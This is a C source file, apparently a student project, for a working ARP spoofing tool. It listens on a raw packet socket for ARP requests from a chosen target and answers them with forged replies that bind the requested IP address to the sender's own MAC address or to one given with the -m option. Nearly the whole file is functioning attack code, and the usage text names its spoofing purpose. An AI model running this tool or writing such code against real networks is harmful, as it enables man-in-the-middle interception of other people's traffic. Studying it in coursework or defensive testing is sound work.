#define _GNU_SOURCE
#include <sys/socket.h>
#include <stdlib.h>
#include <stdio.h>
#include <netdb.h>
#include <ifaddrs.h>
#include <arpa/inet.h>
#include <string.h>
#include <errno.h>
#include <linux/socket.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ether.h>
#include <netinet/if_ether.h>
#include <net/if.h>
#include <unistd.h>
#include <stdbool.h>
#include <fcntl.h>
#include <signal.h>

#include "libft.h"

enum e_host_type
{
	IP_ADDRESS,
	MAC_ADDRESS,
	HOSTNAME
};

struct s_host
{
	char *h_name;
	struct in_addr ip_addr;
	char **ip_list;
	struct ether_addr mac_addr;
};

struct s_env
{
	int sfd;
	int loop;

	int given_host_type;

	// program options
	struct s_host host;
	struct s_host requested_host;
	struct ether_addr mac_address;

	bool verbose;
};

struct s_env g_env = {
	.sfd = 0,
	.loop = true,
	.given_host_type = 0,
	.host = {
		.h_name = NULL,
		.ip_addr = {0},
		.ip_list = NULL,
		.mac_addr = {{0}},
	},
	.requested_host = {
		.h_name = NULL,
		.ip_addr = {0},
		.ip_list = NULL,
		.mac_addr = {{0}},
	},
	.mac_address = {{0}},
	.verbose = false
};

void handle_sigint(int sig)
{
	if (sig == SIGINT)
	{
		// can be called asynchronously
		g_env.loop = false; // set flag
		close(g_env.sfd);
	}
}

void print_ethernet_header(struct ether_header *eth_hdr)
{
	if (g_env.verbose)
	{
		printf("     Source MAC: %s\n", ft_ether_ntoa((struct ether_addr *)eth_hdr->ether_shost));
		printf("     Target MAC: %s\n", ft_ether_ntoa((struct ether_addr *)eth_hdr->ether_dhost));
	}
}

void print_arp_header(struct ether_arp *arp_hdr, int recv_len)
{
	if (g_env.verbose)
	{
		char sender_ip_str[INET_ADDRSTRLEN];
		char target_ip_str[INET_ADDRSTRLEN];

		if (inet_ntop(AF_INET, arp_hdr->arp_spa, sender_ip_str, sizeof(sender_ip_str)) == NULL)
		{
			fprintf(stderr, "print_arp_header - inet_ntop: %s\n", strerror(errno));
			return;
		}
		if (inet_ntop(AF_INET, arp_hdr->arp_tpa, target_ip_str, sizeof(target_ip_str)) == NULL)
		{
			fprintf(stderr, "print_arp_header - inet_ntop: %s\n", strerror(errno));
			return;
		}

		printf("       Hardware type: %s\n", ntohs(arp_hdr->arp_hrd) == ARPHRD_ETHER ? "Ethernet" : "Unknown");
		printf("       Protocol type: %s\n", ntohs(arp_hdr->arp_pro) == ETHERTYPE_IP ? "IPv4" : "Unknown");
		printf("       Hardware size: %d\n", arp_hdr->arp_hln);
		printf("       Protocol size: %d\n", arp_hdr->arp_pln);
		printf("       Opcode: %s\n", ntohs(arp_hdr->arp_op) == ARPOP_REQUEST ? "Request" : ntohs(arp_hdr->arp_op) == ARPOP_REPLY ? "Reply"
																															   : "Unknown");
		printf("       Sender MAC: %s\n", ft_ether_ntoa((struct ether_addr *)arp_hdr->arp_sha));
		printf("       Sender IP: %s\n", sender_ip_str);
		printf("       Target MAC: %s\n", ft_ether_ntoa((struct ether_addr *)arp_hdr->arp_tha));
		printf("       Target IP: %s\n", target_ip_str);
		printf("       Packet length: %d\n", recv_len);
	}
}

void send_arp_reply(uint8_t *host_ip, uint8_t *host_mac, uint8_t *requested_ip, struct sockaddr_ll *recv_addr)
{
	struct ether_header eth_hdr;
	struct ether_arp arp_hdr;

	// fill ethernet header
	eth_hdr.ether_type = htons(ETHERTYPE_ARP);
	ft_memcpy(eth_hdr.ether_shost, g_env.mac_address.ether_addr_octet, ETHER_ADDR_LEN);
	ft_memcpy(eth_hdr.ether_dhost, host_mac, ETHER_ADDR_LEN);

	// fill arp header
	arp_hdr.arp_hrd = htons(ARPHRD_ETHER);
	arp_hdr.arp_pro = htons(ETHERTYPE_IP);
	arp_hdr.arp_hln = ETHER_ADDR_LEN;
	arp_hdr.arp_pln = sizeof(in_addr_t);
	arp_hdr.arp_op = htons(ARPOP_REPLY);
	ft_memcpy(arp_hdr.arp_sha, g_env.mac_address.ether_addr_octet, ETHER_ADDR_LEN);
	ft_memcpy(arp_hdr.arp_spa, requested_ip, sizeof(in_addr_t));
	ft_memcpy(arp_hdr.arp_tha, host_mac, ETHER_ADDR_LEN);
	ft_memcpy(arp_hdr.arp_tpa, host_ip, sizeof(in_addr_t));

	// fill buffer
	char buf[ETHER_HDR_LEN + sizeof(struct ether_arp)];
	ft_memcpy(buf, &eth_hdr, sizeof(struct ether_header));
	ft_memcpy(buf + sizeof(struct ether_header), &arp_hdr, sizeof(struct ether_arp));

	// print packet
	print_ethernet_header(&eth_hdr);
	print_arp_header(&arp_hdr, sizeof(buf));

	// send packet to requester
	if (sendto(g_env.sfd, buf, sizeof(buf), 0, (struct sockaddr *)recv_addr, sizeof(struct sockaddr_ll)) == -1)
	{
		fprintf(stderr, "Error sending reply: %s\n", strerror(errno));
		return;
	}
	printf("\033[0;31m     Sent reply!\n\033[0m");
}

int handle_arp_packets()
{
	struct sockaddr_ll recv_addr;
	socklen_t recv_addr_len = sizeof(recv_addr);
	char recv_buf[ETH_FRAME_LEN];
	int recv_len;
	char target_ip_str[INET_ADDRSTRLEN];

	struct sigaction act;
	act.sa_handler = handle_sigint;
	act.sa_flags = 0;
	ft_bzero(&act.sa_mask, sizeof(act.sa_mask));

	if (sigaction(SIGINT, &act, NULL) < 0)
	{
		fprintf(stderr, "Error setting signal handler on SIGINT: %s\n", strerror(errno));
		return 1;
	}

	while (g_env.loop)
	{
		ft_memset(&recv_addr, 0, sizeof(recv_addr));
		if (g_env.given_host_type == IP_ADDRESS)
			printf("\n   Waiting for arp request from target (%s)...\n", inet_ntop(AF_INET, &g_env.host.ip_addr, target_ip_str, sizeof(target_ip_str)));
		else if (g_env.given_host_type == MAC_ADDRESS)
			printf("\n   Waiting for arp request from target (%s)...\n", ft_ether_ntoa(&g_env.host.mac_addr));
		else
			printf("\n   Waiting for arp request from target (%s)...\n", g_env.host.h_name);
		recv_len = recvfrom(g_env.sfd, recv_buf, ETH_FRAME_LEN, 0, (struct sockaddr *)&recv_addr, &recv_addr_len);
		if (recv_len == -1 && g_env.loop)
		{
			fprintf(stderr, "   Error receiving packet: %s\n", strerror(errno));
			return 1;
		}
		else if (g_env.loop == false)
		{
			printf("Received SIGINT, exiting...\n");
			break;
		}
		struct ether_header *eth_hdr = (struct ether_header *)recv_buf;
		struct ether_arp *arp_hdr = (struct ether_arp *)(recv_buf + sizeof(struct ether_header));


		// check if the packet is an arp request
		if (ntohs(arp_hdr->arp_op) == ARPOP_REQUEST)
		{
			if (g_env.verbose) {
				printf("    Received request!\n");
				print_ethernet_header(eth_hdr);
				print_arp_header(arp_hdr, recv_len);
			}

			if ((ft_memcmp(&arp_hdr->arp_spa, &g_env.host.ip_addr.s_addr, sizeof(in_addr_t)) == 0) ||
				(ft_memcmp(&arp_hdr->arp_sha, &g_env.host.mac_addr.ether_addr_octet, ETHER_ADDR_LEN) == 0))
			{
				// if request host ip is not null, then the option -r was used and we need to check if the requested host ip is the same as the one in the packet before sending the reply
				if (g_env.requested_host.ip_addr.s_addr != 0 && ft_memcmp(&arp_hdr->arp_tpa, &g_env.requested_host.ip_addr.s_addr, sizeof(in_addr_t)) != 0)
					continue;

				printf("    ARP request matches provided data.\n");

				// send arp reply
				printf("     Sending ARP reply...\n");
				send_arp_reply(arp_hdr->arp_spa, arp_hdr->arp_sha, arp_hdr->arp_tpa, &recv_addr);
			}
		}
	}
	return 0;
}

struct ifaddrs *find_interface(struct ifaddrs *ifaddr)
{
	struct ifaddrs *ifa;
	for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next)
	{
		// check if interface is up and has a broadcast address
		if (ifa->ifa_addr->sa_family == AF_INET && ifa->ifa_flags & IFF_UP && ifa->ifa_flags & IFF_BROADCAST)
		{
			// get the broadcast address
			struct sockaddr_in *broad_addr = (struct sockaddr_in *)ifa->ifa_dstaddr;

			char broad_addr_str[INET_ADDRSTRLEN];
			if (inet_ntop(AF_INET, &(broad_addr->sin_addr), broad_addr_str, sizeof(broad_addr_str)) == NULL)
			{
				fprintf(stderr, "find_interface - inet_ntop: %s\n", strerror(errno));
				break;
			}

			// check if the broadcast address is from the same network using the ifa_netmask
			struct sockaddr_in *mask = (struct sockaddr_in *)ifa->ifa_netmask;

			if (g_env.given_host_type == MAC_ADDRESS || (g_env.host.ip_addr.s_addr & mask->sin_addr.s_addr) == (broad_addr->sin_addr.s_addr & mask->sin_addr.s_addr))
			{
				printf("Found interface %s\n", ifa->ifa_name);
				return ifa;
			}
			// if g_var.host.ip_addr is not set, check all the ips from g_var.host.ip_list
			else if (g_env.host.ip_addr.s_addr == 0)
			{
				for (int i = 0; g_env.host.ip_list[i] != NULL; i++)
				{
					in_addr_t ip = *(in_addr_t *)g_env.host.ip_list[i];
					char ip_str[INET_ADDRSTRLEN];
					if (g_env.verbose)
						printf("Checking if %s is in the same network as %s\n", inet_ntop(AF_INET, &ip, ip_str, sizeof(ip_str)), broad_addr_str);
					// print results of bits operations
					if ((ip & mask->sin_addr.s_addr) == (broad_addr->sin_addr.s_addr & mask->sin_addr.s_addr))
					{
						printf("Found interface %s\n", ifa->ifa_name);
						g_env.host.ip_addr.s_addr = ip;
						return ifa;
					}
					else
					{
						if (g_env.verbose)
							printf("%s is not in the same network as %s\n", inet_ntop(AF_INET, &ip, ip_str, sizeof(ip_str)), broad_addr_str);
					}
				}
			}
			else
			{
				printf("Found interface %s but not in the same network\n", ifa->ifa_name);
			}
		}
	}
	return NULL;
}

int get_mac_address(char *iface, uint8_t *mac)
{
	char path[128];
	int fd;

	snprintf(path, sizeof(path), "/sys/class/net/%s/address", iface);
	fd = open(path, O_RDONLY);
	if (fd == -1)
	{
		fprintf(stderr, "Error opening file /sys/class/net/%s/address: %s\n", iface, strerror(errno));
		return 1;
	}

	char mac_str[18] = {0};
	ssize_t n = read(fd, mac_str, sizeof(mac_str) - 1);
	if (n == -1)
	{
		fprintf(stderr, "%s\n", strerror(errno));
		close(fd);
		return 1;
	}

	if (ft_ether_aton(mac_str, (struct ether_addr *)mac) == 0)
	{
		fprintf(stderr, "Invalid MAC address: %s\n", mac_str);
		close(fd);
		return 1;
	}

	close(fd);
	return 0;
}

int create_socket()
{
	// create socket
	g_env.sfd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
	if (g_env.sfd == -1)
	{
		fprintf(stderr, "Error creating socket: %s\n", strerror(errno));
		return 1;
	}

	// find interface
	struct ifaddrs *ifaddr, *interface;
	if (getifaddrs(&ifaddr) == -1)
	{
		fprintf(stderr, "getifaddrs: %s\n", strerror(errno));
		return 1;
	}

	if ((interface = find_interface(ifaddr)) == NULL)
		return 1;

	// if -m option is not set, use the interface mac address
	if (g_env.mac_address.ether_addr_octet[0] == 0 && g_env.mac_address.ether_addr_octet[1] == 0 && g_env.mac_address.ether_addr_octet[2] == 0 && g_env.mac_address.ether_addr_octet[3] == 0 && g_env.mac_address.ether_addr_octet[4] == 0 && g_env.mac_address.ether_addr_octet[5] == 0)
	{
		if (get_mac_address(interface->ifa_name, g_env.mac_address.ether_addr_octet) == 1)
		{
			return 1;
		}
	}

	// set interface to socket
	if (setsockopt(g_env.sfd, SOL_SOCKET, SO_BINDTODEVICE, interface->ifa_name, ft_strlen(interface->ifa_name)) == -1)
	{
		fprintf(stderr, "Error setting interface to socket: %s\n", strerror(errno));
		return 1;
	}
	freeifaddrs(ifaddr);

	// handle arp packets
	return handle_arp_packets();
}

int get_host(struct s_host *host, char *host_arg)
{
	// check if host is an IP address
	if (inet_pton(AF_INET, host_arg, &host->ip_addr) == 0)
	{
		// check if host is a MAC address
		if (ft_ether_aton(host_arg, &host->mac_addr) == 0)
		{
			// check if host is a hostname and get its IP address if it is
			struct hostent *hostent = gethostbyname(host_arg);
			if (hostent == NULL)
				return -1; // Invalid host
			host->h_name = host_arg;
			host->ip_list = hostent->h_addr_list;
			return HOSTNAME;
		}
		return MAC_ADDRESS;
	}
	return IP_ADDRESS;
}

int get_args(int argc, char **argv)
{
	char *host_arg = argv[1];
	char *requested_host_arg = NULL;
	char *mac_address_arg = NULL;

	for (int i = 2; i < argc; i++)
	{
		if (ft_strcmp(argv[i], "-r") == 0)
		{
			if (i + 1 < argc)
				requested_host_arg = argv[++i];
			else
			{
				printf("Missing argument for -t\n");
				return 1;
			}
		}
		else if (ft_strcmp(argv[i], "-m") == 0)
		{
			if (i + 1 < argc)
				mac_address_arg = argv[++i];
			else
			{
				printf("Missing argument for -m\n");
				return 1;
			}
		}
		else if (ft_strcmp(argv[i], "-v") == 0)
			g_env.verbose = 1;
		else
		{
			printf("Unknown option: %s\n", argv[i]);
			return 1;
		}
	}

	if ((g_env.given_host_type = get_host(&g_env.host, host_arg)) == -1)
	{
		printf("Invalid host: %s\n", host_arg);
		return 1;
	}

	if (requested_host_arg != NULL)
	{
		int ret = get_host(&g_env.requested_host, requested_host_arg);
		if (ret == -1 || ret == 2)
		{
			printf("-r : Invalid requested host: %s\n", requested_host_arg);
			return 1;
		}
	}

	if (mac_address_arg != NULL)
	{
		if (ft_ether_aton(mac_address_arg, &g_env.mac_address) == 0)
		{
			printf("-m : Invalid MAC address\n");
			return 1;
		}
	}

	if (g_env.given_host_type == MAC_ADDRESS)
		printf("Since host given is a MAC address, the interface will be assumed...\n\n");
	printf("Host: %s\n", host_arg);
	if (requested_host_arg != NULL)
		printf("Requested host: %s\n", requested_host_arg);
	if (mac_address_arg != NULL)
		printf("MAC Address sent: %s\n", mac_address_arg);
	if (g_env.verbose)
		printf("Verbose Mode: Enabled\n");
	else
		printf("Verbose Mode: Disabled\n");

	return 0;
}

int main(int argc, char **argv)
{
	if (getuid() != 0)
	{
		fprintf(stderr, "You must be root to run this program.\n");
		return 1;
	}

	if (argc < 2 || argc > 7)
	{
		printf("Usage: %s host [-r requested_host] [-m mac_address] [-v]\n", argv[0]);
		printf("  host: The hostname, IP address, or MAC address of the targeted machine.\n\n");
		printf("Options:\n");
		printf("  -r requested_host: The hostname or IP address of the target's requested machine.\n");
		printf("  -m mac_address: The MAC address used for spoofing, sent in the ARP reply. (by default, the current machine address is used)\n");
		printf("  -v: Enable verbose mode.\n");
		return 1;
	}

	if (get_args(argc, argv) == 1)
		return 1;

	return create_socket();
}